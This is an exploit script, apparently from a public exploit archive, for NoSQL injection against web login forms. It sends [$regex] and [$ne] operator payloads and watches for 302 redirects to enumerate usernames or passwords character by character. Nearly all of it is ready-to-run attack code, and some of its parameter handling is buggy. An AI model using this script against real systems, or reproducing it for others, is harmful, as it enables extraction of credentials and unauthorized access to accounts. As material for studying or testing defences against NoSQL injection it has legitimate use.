# Exploit Title: Nosql injection username/password enumeration
# Author: Kalana Sankalpa (Anon LK)
# Websites: https://www.widane.com, https://blogofkalana.wordpress.com
# Blogpost: https://blogofkalana.wordpress.com/2019/11/14/nosql-injection-username-and-password-enumeration/

#!/usr/bin/python
import string
import requests
import argparse
import sys
from colorama import Fore

parser = argparse.ArgumentParser()
parser.add_argument("-u", action='store', metavar="URL", help="Form submission url. Eg: http://example.com/index.php")
parser.add_argument("-up", action='store', metavar="parameter", help="Parameter name of the username. Eg: username, user")
parser.add_argument("-pp", action='store', metavar="parameter", help="Parameter name of the password. Eg: password, pass")
parser.add_argument("-op", action='store', metavar="parameters", help="Other paramters with the values. Separate each parameter with a comma(,). Eg: login:Login, submit:Submit")
parser.add_argument("-ep", action='store', metavar="parameter", help="Parameter that need to enumerate. Eg: username, password")
parser.add_argument("-m", action='store', metavar="Method", help="Method of the form. Eg: GET/POST")
args = parser.parse_args()

if len(sys.argv) == 1:
	print(parser.print_help(sys.stderr))
	print(Fore.YELLOW + "\nExample: python " + sys.argv[0] + " -u http://example.com/index.php -up username -pp password -ep username -op login:login,submit:submit -m POST")
	exit(0)
if args.u:
	url = args.u
else:
	print(Fore.RED + "Error: please enter URL with -u. ")
	exit(0)

if args.up:
	userpara = args.up
else:
	print(Fore.RED + "Error: please enter User Parameter with -up.")
	exit(0)

if args.pp:
	passpara = args.pp
else:
	print("Error: Fore.RED + please enter Password Parameter with -pp.")
	exit(0)

if args.ep:
	if args.ep == args.up:
		para1 = userpara
		para2 = passpara
	elif args.ep == args.pp:
		para1 = passpara
		para2 = userpara
	else:
		print(Fore.RED + "Error: please enter the valid parameter that need to enumarate")
		exit(0)
else:
	print(Fore.RED + "Error: please enter the Parameter that need to enumerate with -ep.")
	exit(0)

if args.op:
	otherpara = "," + args.op
else:
	otherpara = ""

if args.m is None:
	print(Fore.RED + "Warning: No method given. Using POST as the method. (You can give the method with -m)")
	
def method(url, para):
	if args.m:
		if args.m[0] == "p" or args.m[0] == "P":
			return requests.post(url, data=para, allow_redirects=False)
		elif args.m[0] == "g" or args.m[0] == "G":
			return requests.get(url, params=para, allow_redirects=False)
		else:
			print(Fore.RED + "Error: Invalid method")
			exit(0)
	else:
		return requests.post(url, data=para, allow_redirects=False)

characters = string.ascii_letters + string.digits + "!@#%()_=-`~[]\';/,<>:{}"
loop = True
finalout = ""
count = 0

for firstChar in characters:
	para = {para1 + '[$regex]' : "^" + firstChar + ".*", para2 + '[$ne]' : '1' + otherpara}
	r = method(url, para)
	if r.status_code != 302:
			print(Fore.MAGENTA + "No pattern starts with '" + firstChar + "'")
			continue;

	loop = True
	print(Fore.GREEN + "Pattern found that starts with '" + firstChar + "'")
	userpass = firstChar
	while loop:
		loop = False

		for char in characters:
			payload = userpass + char
			para = {para1 + '[$regex]' : "^" + payload + ".*", para2 + '[$ne]' : '1' + otherpara}
			r = method(url, para)
	
			if r.status_code == 302:
				print(Fore.YELLOW + "Pattern found: " + payload)
				userpass = payload
				loop = True

	print(Fore.GREEN + para1 + " found: "  + userpass)
	finalout +=  userpass + "\n"
	count += 1;

if finalout != "":
	print("\n" + str(count) + " " + para1 + " found:")
	print(Fore.RED + finalout)
else:
	print(Fore.RED + "No " + para1 + " found")

	
